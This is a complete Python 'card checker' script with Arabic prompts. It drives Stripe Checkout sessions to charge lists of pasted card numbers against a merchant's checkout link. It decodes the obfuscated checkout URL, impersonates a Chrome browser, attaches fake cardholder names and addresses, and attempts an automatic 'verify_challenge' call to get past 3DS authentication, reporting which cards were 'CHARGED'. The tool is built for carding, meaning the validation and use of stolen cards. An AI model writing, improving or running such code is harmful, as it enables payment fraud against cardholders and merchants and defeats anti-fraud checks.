#!/usr/bin/env python3
import os, re, sys, json, time, uuid, hmac, base64, random, hashlib, asyncio
import urllib.parse
from urllib.parse import unquote, urlencode
from datetime import datetime
from typing import Any, Dict, Optional

try:
    from curl_cffi.requests import AsyncSession
except ImportError:
    print("pip install curl-cffi --break-system-packages"); sys.exit(1)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
SJUA = "stripe.js/da394b0aef; stripe-js-v3/da394b0aef; checkout"
STRIPE_VER = "2020-08-27"

class C:
    R="\033[0m";B="\033[1m";RED="\033[91m";GRN="\033[92m";YEL="\033[93m"
    CYN="\033[96m";LIME="\033[38;5;118m";GOLD="\033[38;5;214m"

def log(t, color=C.CYN):
    print(f"{color}[{datetime.now().strftime('%H:%M:%S')}] {t}{C.R}")

def decode_fid(fid_or_url: str) -> dict[str, Any]:
    if not fid_or_url: return {}
    raw = str(fid_or_url).strip()
    session_id = None
    m_session = re.search(r"\b(cs_(?:live|test)_[a-zA-Z0-9]+)\b", raw)
    if m_session: session_id = m_session.group(1)
    if "#" in raw: raw = raw.split("#", 1)[1]
    raw = raw.split("?", 1)[0]
    if "_secret_" in raw:
        parts = raw.split("_secret_", 1)
        if not session_id and parts[0].startswith("cs_"): session_id = parts[0]
        raw = parts[1]
    unquoted = urllib.parse.unquote(raw)
    b64_str = unquoted.strip().rstrip("%")
    if not b64_str: return {}
    pad = b64_str + "=" * (-len(b64_str) % 4)
    try: decoded_bytes = base64.b64decode(pad, altchars=b"-_")
    except Exception:
        try: decoded_bytes = base64.b64decode(pad)
        except Exception: return {}
    xored_bytes = bytes(b ^ 5 for b in decoded_bytes)
    xored_text = xored_bytes.decode("utf-8", errors="replace").strip()
    try: data = json.loads(xored_text)
    except json.JSONDecodeError: return {}
    if not isinstance(data, dict): return {"value": data}
    if session_id:
        if "checkoutSessionId" not in data and "sessionId" not in data: data["checkoutSessionId"] = session_id
        if "client_secret" not in data: data["client_secret"] = f"{session_id}_secret_{b64_str}"
    return data

class StripeSession:
    def __init__(self, url):
        self.url = url.strip()
        self.pk = ""; self.cs = ""; self.acct = None
        self.merchant = "Stripe"; self.amount_str = "N/A"; self.raw_amount = 0
        self.session = None; self.email = ""
        self.init_json = {}
        self.tracking = {"muid": str(uuid.uuid4()), "sid": str(uuid.uuid4()), "guid": str(uuid.uuid4())}

    def _hdrs(self, ref=None):
        h = {
            "accept": "application/json", "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://checkout.stripe.com",
            "referer": ref or f"https://checkout.stripe.com/c/pay/{self.cs}",
            "user-agent": UA, "stripe-version": STRIPE_VER,
        }
        if self.acct: h["stripe-account"] = self.acct
        return h

    async def prefetch(self):
        fid = decode_fid(self.url)
        self.cs = fid.get("checkoutSessionId") or ""
        self.pk = fid.get("apiKey") or ""
        self.acct = fid.get("stripeAccount")
        if not self.cs:
            m = re.search(r"cs_(?:live|test)_[A-Za-z0-9]+", self.url)
            if m: self.cs = m.group(0)
        if not self.pk or not self.cs: return False, "missing cs/pk"
        
        if self.session: await self.session.close()
        self.session = AsyncSession(impersonate="chrome", timeout=30)
        
        try:
            body = f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url"
            r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/init", headers=self._hdrs(), data=body)
            j = r.json()
        except Exception as e:
            return False, str(e)
            
        if "error" in j:
            e = j["error"]; return False, f"{e.get('code')}: {e.get('message')}"
            
        ac = j.get("account_settings") or {}
        self.merchant = ac.get("display_name") or ac.get("business_name") or "Stripe Merchant"
        cu = j.get("customer") or {}; self.email = cu.get("email") or j.get("customer_email") or ""
        ts = j.get("total_summary") or {}; inv = j.get("invoice") or {}
        lig = j.get("line_item_group") or {}; pi = j.get("payment_intent") or {}
        self.raw_amount = (ts.get("due") or ts.get("total") or inv.get("amount_due") or inv.get("total") or lig.get("total") or pi.get("amount") or 0)
        curr = (j.get("currency") or "usd").upper()
        self.amount_str = f"{self.raw_amount/100:.2f} {curr}" if self.raw_amount else "N/A"
        self.init_json = j
        return True, None

    async def _tokenize(self, card):
        name = random.choice(["James Smith","John Doe","Alex Turner","Michael Brown"])
        email = self.email or f"user{random.randint(1000,99999)}@gmail.com"
        data = {
            "type": "card", "card[number]": card["cc"], "card[cvc]": card["cvv"],
            "card[exp_month]": card["mm"], "card[exp_year]": card["yy"],
            "billing_details[name]": name, "billing_details[email]": email,
            "billing_details[address][country]": "US", "billing_details[address][line1]": f"{random.randint(100,9999)} Main St",
            "billing_details[address][city]": "New York", "billing_details[address][postal_code]": "10001",
            "billing_details[address][state]": "NY", "payment_user_agent": SJUA,
            "time_on_page": str(random.randint(45000, 120000)),
            "guid": self.tracking["guid"], "muid": self.tracking["muid"], "sid": self.tracking["sid"], "key": self.pk,
        }
        try:
            r = await self.session.post("https://api.stripe.com/v1/payment_methods", data=data, headers=self._hdrs())
            j = r.json()
            if "error" in j:
                e = j["error"]; return None, (e.get("decline_code") or e.get("code") or "token_failed"), e.get("message", "")
            return j.get("id"), None, None
        except Exception as e: return None, "net", str(e)[:80]

    async def charge(self, card):
        res = {"card": f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}", "status": "ERROR", "message": "", "response_time": 0, "success": False, "merchant": self.merchant, "amount": self.amount_str}
        t0 = time.time()
        try:
            pm_id, code, msg = await self._tokenize(card)
            if not pm_id:
                res["status"] = "DECLINED"; res["message"] = f"{(code or '').upper()}: {msg}".strip(": ")
                res["response_time"] = time.time() - t0; return res
            
            total = self.raw_amount; checksum = self.init_json.get("init_checksum", "")
            data = {
                "payment_method": pm_id, "expected_payment_method_type": "card",
                "return_url": f"https://checkout.stripe.com/c/pay/{self.cs}", "key": self.pk,
                "eid": "NA", "init_checksum": checksum,
                "client_attribution_metadata[client_session_id]": self.cs,
                "client_attribution_metadata[merchant_integration_source]": "checkout",
                "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
            }
            if total > 0:
                data["expected_amount"] = total
                
            r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm", data=data, headers=self._hdrs())
            j = r.json()
            res["response_time"] = time.time() - t0
            
            if "error" in j:
                err = j["error"]
                res["status"] = "DECLINED"
                res["message"] = f"{err.get('code', '').upper()}: {err.get('message', '')}"
                return res
                
            pi = j.get("payment_intent") or j.get("setup_intent") or j
            st = pi.get("status") or j.get("status") or ""
            
            if st in ("succeeded", "requires_capture", "complete") or j.get("payment_status") == "paid":
                res["status"] = "CHARGED"; res["message"] = "Success (Live)"; res["success"] = True
            elif st == "requires_action":
                # محاولة إرسال تأكيد إضافي لتجاوز الـ requires_action أوتوماتيكياً
                pi_id = pi.get("id")
                cs_sec = pi.get("client_secret")
                if pi_id and cs_sec:
                    endpoint = "setup_intents" if pi_id.startswith("seti_") else "payment_intents"
                    verify_r = await self.session.post(f"https://api.stripe.com/v1/{endpoint}/{pi_id}/verify_challenge", data={"key": self.pk, "client_secret": cs_sec}, headers=self._hdrs())
                    v_j = verify_r.json()
                    v_pi = v_j.get("payment_intent") or v_j.get("setup_intent") or v_j
                    v_st = v_pi.get("status") if isinstance(v_pi, dict) else ""
                    if v_st in ("succeeded", "requires_capture", "complete"):
                        res["status"] = "CHARGED"; res["message"] = "Success via Auto-Verify"; res["success"] = True
                        return res
                res["status"] = "REQUIRES_ACTION"; res["message"] = "3DS / Challenge Required"
            else:
                res["status"] = st.upper() if st else "UNKNOWN"
                res["message"] = f"Status: {st}"
            return res
        except Exception as e:
            res["message"] = f"Exception: {str(e)[:60]}"; res["response_time"] = time.time() - t0; return res

    async def close(self):
        if self.session: await self.session.close()

def parse_card(line):
    p = re.split(r'[|/\s,]+', line.strip())
    if len(p) < 4: return None
    cc = re.sub(r'\D', '', p[0])
    if not (13 <= len(cc) <= 19): return None
    try: mm = p[1].strip().zfill(2); _ = int(mm)
    except: return None
    if not (1 <= int(mm) <= 12): return None
    yy = p[2].strip()
    if len(yy) == 2: yy = "20" + yy
    if not (yy.isdigit() and len(yy) == 4): return None
    cvv = re.sub(r'\D', '', p[3])
    if len(cvv) not in (3, 4): return None
    return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}

async def main():
    print(f"{C.CYN}{C.B}═══ Stripe Direct API Fast Checker ═══{C.R}\n")
    url = input(f"{C.GOLD}▸ أدخل رابط Stripe Checkout: {C.R}").strip()
    if not url.startswith("http"):
        print(f"{C.RED}❌ رابط غير صالح.{C.R}")
        return

    print(f"\n{C.GOLD}▸ أدخل البطاقات (CC|MM|YY|CVV). لما تخلص اكتب 'done':{C.R}")
    cards_input = []
    while True:
        line = input("  > ").strip()
        if line.lower() == 'done': break
        if line: cards_input.append(line)
            
    cards = [parse_card(c) for c in cards_input]
    cards = [c for c in cards if c]
    
    if not cards:
        print(f"{C.RED}❌ مفيش بطاقات صالحة.{C.R}")
        return
        
    print(f"\n{C.LIME}🚀 بدء الفحص السريع لـ {len(cards)} بطاقة...{C.R}\n")
    
    for i, card in enumerate(cards, 1):
        print(f"{C.CYN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.R}")
        print(f"{C.YEL}⏳ بطاقة [{i}/{len(cards)}]: {card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}{C.R}")
        
        sess = StripeSession(url)
        ok, err = await sess.prefetch()
        if not ok:
            print(f"{C.RED}❌ فشل جلب الجلسة: {err}{C.R}\n")
            await sess.close()
            continue
            
        print(f"🛒 المتجر: {sess.merchant} | المبلغ: {sess.amount_str}")
        
        res = await sess.charge(card)
        await sess.close()
        
        color = C.LIME if res['status'] in ('CHARGED', 'LIVE') else C.RED
        icon = "✅" if res['success'] else "❌"
        
        print(f"{color}{icon} النتيجة: {res['status']}{C.R}")
        print(f"▸ الرسالة: {res['message']}")
        print(f"▸ الوقت: {res['response_time']:.1f}s\n")
        
        await asyncio.sleep(0.5)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{C.RED}تم الإيقاف.{C.R}")
        sys.exit(0)
